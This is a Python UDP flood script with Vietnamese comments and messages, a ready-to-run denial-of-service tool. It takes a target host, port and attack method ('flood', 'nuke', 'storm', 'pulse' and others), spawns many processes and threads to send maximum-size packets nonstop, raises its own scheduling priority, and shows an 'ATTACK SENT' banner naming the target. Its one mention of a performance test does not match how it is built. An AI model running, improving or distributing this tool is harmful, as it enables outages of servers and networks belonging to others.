#!/usr/bin/env python3
import sys
import socket
import threading
import multiprocessing as mp
import signal
import time
import os
import random
import psutil
import struct
import fcntl
import logging
from collections import deque
import zlib
import re

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('udp_flood.log'),
        logging.StreamHandler()
    ]
)

# Global configuration
host = None
port = None
method = None
running = True
stats_lock = threading.Lock()
flood = 1472
nuke = 65507
buffer = 16*1024*1024
THREADS_PER_CORE = 8
UPDATE_INTERVAL = 0.1
BATCH_SIZE = 10000
PULSE_INTERVAL = 0.01
MAX_PROCESSES = mp.cpu_count() * 2
CPU_THRESHOLD = 80  # Ngưỡng CPU (%) để bật/tắt nén

class PerformanceStats:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.last_update = self.start_time
        self.pps_history = deque(maxlen=20)
        self.bps_history = deque(maxlen=20)
        
    def update(self, packets, bytes_count):
        with stats_lock:
            self.packets_sent += packets
            self.bytes_sent += bytes_count
            
    def get_stats(self):
        current_time = time.time()
        elapsed = current_time - self.start_time
        
        if elapsed > 0:
            current_pps = self.packets_sent / elapsed
            current_bps = self.bytes_sent / elapsed
            
            self.pps_history.append(current_pps)
            self.bps_history.append(current_bps)
            
            avg_pps = sum(self.pps_history) / len(self.pps_history)
            avg_bps = sum(self.bps_history) / len(self.bps_history)
            
            return {
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'pps': avg_pps,
                'bps': avg_bps,
                'mbps': (avg_bps * 8) / (1024 * 1024),
                'gbps': (avg_bps * 8) / (1024 * 1024 * 1024),
                'elapsed': elapsed
            }
        return None

stats = PerformanceStats()

def validate_host(host):
    """Kiểm tra tính hợp lệ của host"""
    try:
        # Kiểm tra định dạng IP
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
            socket.inet_aton(host)
        # Kiểm tra hostname
        else:
            socket.gethostbyname(host)
        return True
    except (socket.error, ValueError) as e:
        logging.error(f"Host không hợp lệ: {host} - {e}")
        return False

def validate_port(port):
    """Kiểm tra tính hợp lệ của port"""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return True
        logging.error(f"Cổng không hợp lệ: {port}. Phải từ 1 đến 65535")
        return False
    except ValueError:
        logging.error(f"Cổng phải là số nguyên: {port}")
        return False

def check_cpu_load():
    """Kiểm tra tải CPU để quyết định có nén dữ liệu hay không"""
    return psutil.cpu_percent(interval=0.1) < CPU_THRESHOLD

def create_optimized_socket():
    """Tạo socket UDP với tối ưu hóa hiệu suất cao"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, buffer)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, buffer)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        if hasattr(socket, 'SO_REUSEPORT'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
        sock.setblocking(False)
        
        if hasattr(socket, 'SO_BUSY_POLL'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BUSY_POLL, 10)
        
        return sock
    except Exception as e:
        logging.error(f"Tạo socket thất bại: {e}")
        return None

def generate_packet_data(packet_size, method):
    """Tạo dữ liệu gói tin tùy theo phương thức"""
    try:
        if method == "random":
            return os.urandom(packet_size)
        elif method == "storm" and check_cpu_load():
            return zlib.compress(b'\x00' * packet_size)[:packet_size]
        else:
            return struct.pack(f'{packet_size}s', b'\x00' * packet_size)
    except Exception as e:
        logging.error(f"Lỗi khi tạo dữ liệu gói tin: {e}")
        return struct.pack(f'{packet_size}s', b'\x00' * packet_size)

def high_performance_sender(packet_size, thread_id, process_id=0):
    """Gửi gói tin với hiệu suất tối ưu"""
    global running
    
    sock = create_optimized_socket()
    if not sock:
        return
    
    packet_data = generate_packet_data(packet_size, method)
    local_packets = 0
    local_bytes = 0
    retry_count = 0
    max_retries = 3
    
    try:
        sock.connect((host, port))
        
        while running:
            batch_packets = 0
            batch_bytes = 0
            
            if method == "pulse":
                for _ in range(BATCH_SIZE):
                    if not running:
                        break
                    try:
                        sock.send(packet_data)
                        batch_packets += 1
                        batch_bytes += len(packet_data)
                        retry_count = 0
                    except BlockingIOError:
                        time.sleep(0.00001)  # Tăng thời gian nghỉ
                        continue
                    except Exception as e:
                        retry_count += 1
                        if retry_count >= max_retries:
                            logging.warning(f"Luồng {thread_id} (PID {process_id}) bỏ qua sau {max_retries} lần thử: {e}")
                            break
                        time.sleep(0.001)
                        continue
                time.sleep(PULSE_INTERVAL)
            else:
                for _ in range(BATCH_SIZE):
                    if not running:
                        break
                    try:
                        sock.send(packet_data)
                        batch_packets += 1
                        batch_bytes += len(packet_data)
                        retry_count = 0
                    except BlockingIOError:
                        time.sleep(0.00001)
                        continue
                    except Exception as e:
                        retry_count += 1
                        if retry_count >= max_retries:
                            logging.warning(f"Luồng {thread_id} (PID {process_id}) bỏ qua sau {max_retries} lần thử: {e}")
                            break
                        time.sleep(0.001)
                        continue
            
            if batch_packets > 0:
                stats.update(batch_packets, batch_bytes)
                local_packets += batch_packets
                local_bytes += batch_bytes
                
    except Exception as e:
        logging.error(f"Luồng {thread_id} (PID {process_id}) gặp lỗi: {e}")
    finally:
        sock.close()

def worker_process(packet_sizes, process_id, num_threads):
    """Quản lý nhiều luồng trong một tiến trình"""
    global running
    
    p = psutil.Process()
    try:
        p.nice(-20)
        p.ionice(psutil.IOPRIO_CLASS_RT, 0)
    except Exception as e:
        logging.warning(f"Không thể tăng độ ưu tiên tiến trình {process_id}: {e}")
    
    threads = []
    for thread_id in range(num_threads):
        for size in packet_sizes:
            thread = threading.Thread(
                target=high_performance_sender,
                args=(size, thread_id, process_id),
                daemon=True
            )
            threads.append(thread)
            thread.start()
    
    try:
        while running:
            time.sleep(0.01)
    except KeyboardInterrupt:
        running = False

def stats_reporter():
    """Báo cáo thống kê thời gian thực"""
    global running
    
    logging.info("\n" + "="*80)
    logging.info(f"{'THỜI GIAN':<12} {'GÓI TIN':<12} {'PPS':<12} {'MBPS':<8} {'GBPS':<8} {'TỔNG GB':<10}")
    logging.info("="*80)
    
    while running:
        try:
            time.sleep(UPDATE_INTERVAL)
            
            if not running:
                break
                
            stat_data = stats.get_stats()
            if stat_data:
                elapsed_str = f"{stat_data['elapsed']:.1f}s"
                packets_str = f"{stat_data['packets']:,}"
                pps_str = f"{stat_data['pps']:,.0f}"
                mbps_str = f"{stat_data['mbps']:.1f}"
                gbps_str = f"{stat_data['gbps']:.2f}"
                total_gb_str = f"{stat_data['bytes']/(1024*1024*1024):.2f}"
                
                logging.info(f"{elapsed_str:<12} {packets_str:<12} {pps_str:<12} {mbps_str:<8} {gbps_str:<8} {total_gb_str:<10}")
                
        except KeyboardInterrupt:
            running = False
            break

def signal_handler(sig, frame):
    """Xử lý Ctrl+C"""
    global running
    logging.info("\n[!] Phát hiện CTRL+C! Đang dừng kiểm tra hiệu suất...")
    running = False
    
    time.sleep(1)
    final_stats = stats.get_stats()
    if final_stats:
        logging.info("\n" + "="*60)
        logging.info("THỐNG KÊ HIỆU SUẤT CUỐI CÙNG")
        logging.info("="*60)
        logging.info(f"Tổng thời gian chạy:     {final_stats['elapsed']:.2f} giây")
        logging.info(f"Tổng số gói tin:        {final_stats['packets']:,}")
        logging.info(f"Tổng dữ liệu:          {final_stats['bytes']/(1024*1024*1024):.2f} GB")
        logging.info(f"PPS trung bình:        {final_stats['pps']:,.0f} gói/giây")
        logging.info(f"Thông lượng trung bình: {final_stats['gbps']:.3f} Gbps")
        logging.info("="*60)
    
    sys.exit(0)

def display_banner():
    logging.info(f""" 
                 ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                 ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║┤ ║║║ ║
                 ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩      
         ╚═══════╦══════════════════════════════╦════════╝
       ╔═════════╩══════════════════════════════╩══════════╗  
                 Mục tiêu    × [{host}]
                 Cổng        × [{port}]
                 Phương thức × [{method}]
       ╚═════════╦═══════════════════════════════╦═════════╝
         ╔═══════╩═══════════════════════════════╩═══════╗
                 QUẢN TRỊ    × [Alex]
             ╚═══════════════════════════════════════════════╝""")

def adjust_threads():
    """Điều chỉnh số luồng dựa trên tải CPU"""
    cpu_percent = psutil.cpu_percent(interval=0.1)
    if cpu_percent > 90:
        return max(1, THREADS_PER_CORE // 2)
    elif cpu_percent > 70:
        return THREADS_PER_CORE
    return THREADS_PER_CORE * 2

def main():
    global host, port, method, running
    
    if len(sys.argv) != 4:
        logging.error("Cách dùng: python3 udp_improved.py <host> <port> <method>")
        logging.error("Phương thức: flood, nuke, mix, storm, pulse, random")
        sys.exit(1)
    
    host = sys.argv[1]
    port = sys.argv[2]
    method = sys.argv[3].lower()
    
    if not validate_host(host):
        sys.exit(1)
    if not validate_port(port):
        sys.exit(1)
    port = int(port)
    
    if method not in ['flood', 'nuke', 'mix', 'storm', 'pulse', 'random']:
        logging.error("Phương thức không hợp lệ. Sử dụng: flood, nuke, mix, storm, pulse, random")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    display_banner()
    
    if method == 'flood':
        packet_sizes = [flood]
    elif method == 'nuke':
        packet_sizes = [nuke]
    elif method == 'storm':
        packet_sizes = [random.randint(100, nuke) for _ in range(10)]
    elif method == 'pulse':
        packet_sizes = [nuke]
    elif method == 'random':
        packet_sizes = [random.randint(100, nuke) for _ in range(10)]
    else:
        packet_sizes = [flood, nuke]
    
    num_processes = min(MAX_PROCESSES, mp.cpu_count() * 2)
    threads_per_process = adjust_threads()
    
    logging.info(f"Khởi động {num_processes} tiến trình với {threads_per_process} luồng mỗi tiến trình...")
    logging.info(f"Kích thước gói tin: {packet_sizes}")
    logging.info("Nhấn Ctrl+C để dừng và hiển thị thống kê cuối cùng\n")
    
    stats_thread = threading.Thread(target=stats_reporter, daemon=True)
    stats_thread.start()
    
    processes = []
    for process_id in range(num_processes):
        process = mp.Process(
            target=worker_process,
            args=(packet_sizes, process_id, threads_per_process)
        )
        process.start()
        processes.append(process)
    
    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        running = False
        for process in processes:
            if process.is_alive():
                process.terminate()
                process.join(timeout=1)

if __name__ == "__main__":
    try:
        os.nice(-20)
        p = psutil.Process()
        p.ionice(psutil.IOPRIO_CLASS_RT, 0)
    except Exception as e:
        logging.warning(f"Không thể tăng độ ưu tiên tiến trình chính: {e}")
    
    main()